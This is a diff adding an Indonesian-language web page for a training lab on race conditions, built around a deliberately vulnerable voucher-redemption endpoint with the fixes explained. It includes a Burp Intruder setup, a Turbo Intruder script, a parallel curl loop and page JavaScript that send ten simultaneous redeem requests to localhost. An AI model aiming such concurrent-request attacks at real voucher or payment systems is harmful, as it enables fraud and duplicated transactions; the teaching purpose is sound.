@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="LAB 3: Race Condition – Simulasi eksploitasi voucher sekali pakai yang digunakan berkali-kali." />
+  <title><%= title %> | CyberLAB</title>
+  <link rel="stylesheet" href="/css/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<%- include('partials/navbar') %>
+
+<main class="main-content">
+
+  <div class="page-header vuln-page-header">
+    <div class="page-header-inner">
+      <div class="lab-badge vuln-badge">⚠️ VULNERABLE VERSION</div>
+      <h1>⚡ LAB 3: Race Condition</h1>
+      <p>Simulasi eksploitasi voucher sekali pakai dengan mengirim banyak request bersamaan.</p>
+    </div>
+  </div>
+
+  <div class="lab-container">
+
+    <!-- KONSEP -->
+    <section class="lab-section">
+      <h2>📖 Konsep</h2>
+      <div class="concept-box">
+        <p><strong>Race Condition</strong> terjadi ketika beberapa request dikirim hampir bersamaan, sehingga lebih dari satu request dapat lolos sebelum sistem memperbarui status data.</p>
+        <div class="race-diagram">
+          <div class="race-step">
+            <span class="race-req">Request 1</span>
+            <span class="race-arrow">→</span>
+            <span class="race-action">Cek voucher (belum digunakan ✓)</span>
+          </div>
+          <div class="race-step">
+            <span class="race-req">Request 2</span>
+            <span class="race-arrow">→</span>
+            <span class="race-action">Cek voucher (belum digunakan ✓) ← Masuk sebelum update!</span>
+          </div>
+          <div class="race-step">
+            <span class="race-req">Request 1</span>
+            <span class="race-arrow">→</span>
+            <span class="race-action">Tambah poin + tandai used</span>
+          </div>
+          <div class="race-step">
+            <span class="race-req">Request 2</span>
+            <span class="race-arrow">→</span>
+            <span class="race-action">Tambah poin lagi! ⚠️</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- STATUS BOARD -->
+    <section class="lab-section">
+      <h2>📊 Status Saat Ini</h2>
+      <div class="status-board vuln-board" id="status-board">
+        <div class="status-item">
+          <div class="status-label">👤 User</div>
+          <div class="status-value" id="stat-username"><%= user.username %></div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">💰 Poin</div>
+          <div class="status-value status-points" id="stat-points"><%= user.points %></div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">🎟️ Voucher</div>
+          <div class="status-value" id="stat-voucher"><%= voucher.code %></div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">📋 Status Voucher</div>
+          <div class="status-value <%= voucher.is_used ? 'status-used' : 'status-available' %>" id="stat-voucher-status">
+            <%= voucher.is_used ? '✅ Sudah Digunakan' : '🟢 Tersedia' %>
+          </div>
+        </div>
+        <div class="status-item">
+          <div class="status-label">🎁 Reward</div>
+          <div class="status-value"><%= voucher.reward %> poin</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SIMULASI VULNERABLE -->
+    <section class="lab-section">
+      <h2>🧪 Simulasi Serangan Race Condition</h2>
+      <div class="vuln-box">
+        <div class="vuln-label">⚠️ Endpoint Vulnerable: <code>POST /lab/race-condition/redeem</code></div>
+        <p>Server memiliki delay 200–500ms antara pengecekan dan update — celah untuk race condition!</p>
+
+        <div class="race-buttons">
+          <button class="btn btn-vuln" id="btn-redeem-once" onclick="redeemOnce()">
+            🎟️ Redeem Voucher Sekali
+          </button>
+          <button class="btn btn-race" id="btn-race-attack" onclick="raceAttack()">
+            ⚡ Simulasikan 10 Request Bersamaan
+          </button>
+          <button class="btn btn-reset" id="btn-reset-vuln" onclick="resetVuln()">
+            🔄 Reset Data
+          </button>
+        </div>
+
+        <!-- LOG OUTPUT -->
+        <div class="race-log-container">
+          <div class="race-log-header">
+            <span>📋 Log Response</span>
+            <button onclick="document.getElementById('race-log').innerHTML=''" class="btn-clear-log">🗑️ Clear</button>
+          </div>
+          <div id="race-log" class="race-log"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- APA YANG SALAH / DAMPAK -->
+    <div class="two-col-grid">
+      <section class="lab-section">
+        <h2>❌ Apa yang Salah?</h2>
+        <div class="wrong-box">
+          <ul class="check-list check-red">
+            <li><strong>Check dan update</strong> dilakukan dalam langkah terpisah</li>
+            <li>Tidak ada <strong>locking</strong> pada proses redeem</li>
+            <li>Tidak ada <strong>transaksi database</strong></li>
+            <li>Tidak ada <strong>unique constraint</strong> pada redemption</li>
+            <li>Request bersamaan semua bisa <strong>lolos pengecekan</strong></li>
+          </ul>
+        </div>
+      </section>
+
+      <section class="lab-section">
+        <h2>💥 Dampak</h2>
+        <div class="impact-box">
+          <ul class="check-list check-orange">
+            <li>Voucher sekali pakai bisa digunakan <strong>berkali-kali</strong></li>
+            <li>Reward atau diskon bisa <strong>terduplikasi</strong></li>
+            <li>Saldo/poin bisa menjadi <strong>tidak konsisten</strong></li>
+            <li>Data bisnis menjadi <strong>rusak</strong></li>
+            <li>Dalam sistem finansial, saldo bisa <strong>negatif atau dobel transaksi</strong></li>
+          </ul>
+        </div>
+      </section>
+    </div>
+
+    <!-- CARA MEMPERBAIKI -->
+    <section class="lab-section">
+      <h2>🛠️ Cara Memperbaiki</h2>
+      <div class="fix-box">
+        <ul class="check-list check-green">
+          <li>Gunakan <strong>locking</strong> untuk mencegah proses bersamaan</li>
+          <li>Batasi <strong>request berulang</strong> dengan rate limiting</li>
+          <li>Validasi ulang kondisi data <strong>sebelum update</strong></li>
+          <li>Gunakan <strong>transaksi database</strong> (ACID)</li>
+          <li>Gunakan <strong>unique constraint</strong> agar data tidak bisa dobel</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- BURP SUITE GUIDE – INTRUDER RACE CONDITION -->
+    <section class="lab-section">
+      <h2>🦊 Cara Menggunakan Burp Suite – Race Condition Attack</h2>
+      <div class="burp-guide-box">
+        <p style="color:var(--text-secondary);margin-bottom:1rem;">
+          Selain tombol simulasi di atas, kamu bisa melakukan race condition attack menggunakan
+          <strong>Burp Suite Intruder</strong> atau <strong>Turbo Intruder</strong> untuk simulasi yang lebih realistis.
+        </p>
+
+        <div class="steps-list">
+          <div class="step-item">
+            <span class="step-num">1</span>
+            <div>
+              <strong>Tangkap Request Redeem via Burp</strong>
+              <p>Aktifkan Intercept → klik "Redeem Voucher Sekali" → Burp akan menangkap:</p>
+              <div class="code-block" style="margin-top:0.5rem;">
+                <div class="code-label">Raw POST Request – Race Target</div>
+                <pre><code>POST /lab/race-condition/redeem HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"code":"PROMO100"}</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <span class="step-num">2</span>
+            <div>
+              <strong>Send to Intruder</strong>
+              <p>Klik kanan request → <strong>Send to Intruder</strong></p>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <span class="step-num">3</span>
+            <div>
+              <strong>Konfigurasi Intruder (Sniper Mode)</strong>
+              <div class="code-block" style="margin-top:0.5rem;">
+                <div class="code-label">Konfigurasi Burp Intruder</div>
+                <pre><code>Attack type : Sniper
+Payload type: Null payloads
+Payload count: 10 (kirim 10 request)
+
+Resource Pool → buat pool baru:
+  ✅ Maximum concurrent requests: 10
+  ✅ (centang) Send requests in parallel (HTTP/1)
+
+→ Klik "Start Attack"</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <span class="step-num">4</span>
+            <div>
+              <strong>Metode Alternatif: Turbo Intruder (lebih akurat)</strong>
+              <p>Turbo Intruder adalah extension Burp yang dirancang khusus untuk race condition:</p>
+              <div class="code-block" style="margin-top:0.5rem;">
+                <div class="code-label">Turbo Intruder – Python Script</div>
+                <pre><code># Install: BApp Store → Turbo Intruder
+# Klik kanan request → Extensions → Turbo Intruder
+
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10,
+                           requestsPerConnection=1,
+                           pipeline=False)
+    for i in range(10):
+        engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)</code></pre>
+              </div>
+            </div>
+          </div>
+
+          <div class="step-item">
+            <span class="step-num">5</span>
+            <div>
+              <strong>Metode via curl (tanpa Burp)</strong>
+              <div class="code-block" style="margin-top:0.5rem;">
+                <div class="code-label">Race condition via curl parallel</div>
+                <pre><code># Reset dulu
+curl -X POST http://localhost:3000/lab/race-condition/reset
+
+# Kirim 10 request bersamaan via bash
+for i in $(seq 1 10); do
+  curl -s -X POST http://localhost:3000/lab/race-condition/redeem \
+    -H "Content-Type: application/json" \
+    -d '{"code":"PROMO100"}' &
+done
+wait
+echo "Semua request selesai"</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="info-callout callout-orange" style="margin-top:1rem;">
+          <strong>💡 Tips Burp Suite untuk Race Condition:</strong><br>
+          Burp Suite Pro punya fitur <strong>"Send group in parallel"</strong> (versi baru) yang lebih baik untuk race condition.
+          Community Edition bisa pakai Turbo Intruder (gratis via BApp Store).
+        </div>
+      </div>
+    </section>
+
+    <!-- NAVIGASI -->
+    <div class="nav-to-fixed">
+      <a href="/lab/race-condition/fixed" class="btn btn-fixed-large" id="btn-goto-fixed-race">
+        ✅ Lihat Versi Aman (Fixed) →
+      </a>
+    </div>
+
+  </div>
+</main>
+
+<%- include('partials/footer') %>
+
+<script>
+const ENDPOINT = '/lab/race-condition/redeem';
+const RESET_ENDPOINT = '/lab/race-condition/reset';
+
+function addLog(msg, type = 'info') {
+  const log = document.getElementById('race-log');
+  const entry = document.createElement('div');
+  entry.className = `log-entry log-${type}`;
+  const time = new Date().toLocaleTimeString('id-ID');
+  entry.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
+  log.prepend(entry);
+}
+
+async function updateStatus() {
+  try {
+    const res = await fetch('/lab/race-condition/redeem', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ code: 'PROMO100', statusOnly: true })
+    });
+  } catch(e) {}
+  // Reload halaman untuk update status board
+  location.reload();
+}
+
+async function redeemOnce() {
+  const btn = document.getElementById('btn-redeem-once');
+  btn.disabled = true;
+  addLog('Mengirim 1 request redeem...', 'info');
+
+  try {
+    const res = await fetch(ENDPOINT, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ code: 'PROMO100' })
+    });
+    const data = await res.json();
+    addLog(data.message + (data.newPoints !== undefined ? ` | Poin sekarang: <strong>${data.newPoints}</strong>` : ''), data.success ? 'success' : 'error');
+  } catch (err) {
+    addLog('Fetch error: ' + err.message, 'error');
+  }
+
+  btn.disabled = false;
+  setTimeout(() => location.reload(), 1000);
+}
+
+async function raceAttack() {
+  const btn = document.getElementById('btn-race-attack');
+  btn.disabled = true;
+  addLog('⚡ Mengirim 10 request secara BERSAMAAN...', 'warning');
+
+  const requests = [];
+  for (let i = 0; i < 10; i++) {
+    requests.push(
+      fetch(ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code: 'PROMO100' })
+      }).then(r => r.json()).then(data => ({ i: i+1, ...data }))
+    );
+  }
+
+  const results = await Promise.allSettled(requests);
+  let successCount = 0;
+
+  results.forEach(r => {
+    if (r.status === 'fulfilled') {
+      const d = r.value;
+      if (d.success) {
+        successCount++;
+        addLog(`Request #${d.i}: ✅ ${d.message} | Poin: <strong>${d.newPoints}</strong>`, 'success');
+      } else {
+        addLog(`Request #${d.i}: ❌ ${d.message}`, 'error');
+      }
+    } else {
+      addLog(`Request error: ${r.reason}`, 'error');
+    }
+  });
+
+  addLog(`<strong>Hasil: ${successCount} dari 10 request berhasil redeem!</strong>${successCount > 1 ? ' ← RACE CONDITION BERHASIL! 🎯' : ''}`, successCount > 1 ? 'warning' : 'info');
+
+  btn.disabled = false;
+  setTimeout(() => location.reload(), 1500);
+}
+
+async function resetVuln() {
+  try {
+    const res = await fetch(RESET_ENDPOINT, { method: 'POST' });
+    const data = await res.json();
+    addLog(data.message, 'info');
+    setTimeout(() => location.reload(), 800);
+  } catch (err) {
+    addLog('Reset error: ' + err.message, 'error');
+  }
+}
+</script>
+</body>
+</html>
